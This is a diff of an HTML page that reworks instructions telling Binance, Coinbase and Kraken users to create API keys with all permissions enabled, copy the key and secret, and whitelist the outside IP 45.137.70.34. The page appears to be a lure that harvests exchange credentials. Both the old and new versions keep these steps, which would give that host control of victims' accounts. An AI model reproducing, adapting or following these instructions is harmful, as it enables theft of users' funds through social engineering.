@@ -309,69 +309,58 @@ button:hover {
 
     <div class="status" id="status"></div>
 
-    <!-- API Instructions -->
-<div class="box">
-  <h3 style="margin-top:0;">How to Create an API Key</h3>
-  
-  <p>
-    Follow the steps below to generate your API keys for your exchange account. 
-    For full functionality and proper verification, ensure that you enable 
-    <strong>all required permissions</strong> when creating the key.
-  </p>
-
-  <p>
-    ⚠️ <strong>Important:</strong> Make sure to whitelist the following IP address 
-    in your API settings to ensure secure and uninterrupted access:
-  </p>
-
-  <p style="font-weight:bold; font-size:16px;">
-    45.137.70.34
-  </p>
-
-  <p>
-    Without IP whitelisting, the system may fail to connect or execute requests properly.
-    Always double-check that the IP has been added correctly before proceeding.
-  </p>
-
-  
-  <div style="margin-top:20px;">
-    <b>Binance:</b>
-    <ol>
-      <li>Go to <b>Binance &rarr; Account &rarr; API Management</b></li>
-      <li>Click <b>“Create API”</b></li>
-
-      <li>Enable all available permissions</li>
-      <li>Copy your API Key & Secret</li>
-    </ol>
-  </div>
-
-  <div style="margin-top:20px;">
-    <b>Coinbase:</b>
-    <ol>
-      <li>Go to <b>Settings &rarr; API Keys</b></li>
-      <li>Create a new key</li>
-      <li>Enable all available permissions</li>
-      <li>Copy your API Key & Secret</li>
-    </ol>
-  </div>
-
-  <div style="margin-top:20px;">
-    <b>Kraken:</b>
-    <ol>
-      <li>Navigate to <b>Security &rarr; API</b></li>
-      <li>Generate a <b>New Key</b></li>
-
-      <li>Enable all available permissions</li>
-
-      <li>Copy your API Key & Secret</li>
-    </ol>
-  </div>
-
-  <div style="margin-top:20px;">
-    <b>Reminder:</b>
-    <p>Keep your API keys secure. Do not share them with untrusted parties.</p>
-  </div>
-</div>
+    <div class="box">
+      <h3 style="margin-top:0;">How to Create an API Key</h3>
+    
+      <p>
+        Generate your API keys and enable <strong>all required permissions</strong> 
+        for full functionality.
+      </p>
+    
+      <p>
+        ⚠️ <strong>Whitelist this IP:</strong>
+        <span style="font-weight:bold;">45.137.70.34</span>
+      </p>
+    
+      <hr style="margin:15px 0;">
+    
+      <!-- Binance -->
+      <details>
+        <summary><b>Binance</b></summary>
+        <ol>
+          <li>Account → API Management</li>
+          <li>Create API</li>
+          <li>Enable all permissions</li>
+          <li>Copy API Key & Secret</li>
+        </ol>
+      </details>
+    
+      <!-- Coinbase -->
+      <details>
+        <summary><b>Coinbase</b></summary>
+        <ol>
+          <li>Settings → API Keys</li>
+          <li>Create new key</li>
+          <li>Enable all permissions</li>
+          <li>Copy API Key & Secret</li>
+        </ol>
+      </details>
+    
+      <!-- Kraken -->
+      <details>
+        <summary><b>Kraken</b></summary>
+        <ol>
+          <li>Security → API</li>
+          <li>Generate new key</li>
+          <li>Enable all permissions</li>
+          <li>Copy API Key & Secret</li>
+        </ol>
+      </details>
+    
+      <p style="margin-top:15px; font-size:13px; opacity:0.8;">
+        🔒 Keep your API keys secure. Never share them publicly.
+      </p>
+    </div>
 
 </div>
 </div>
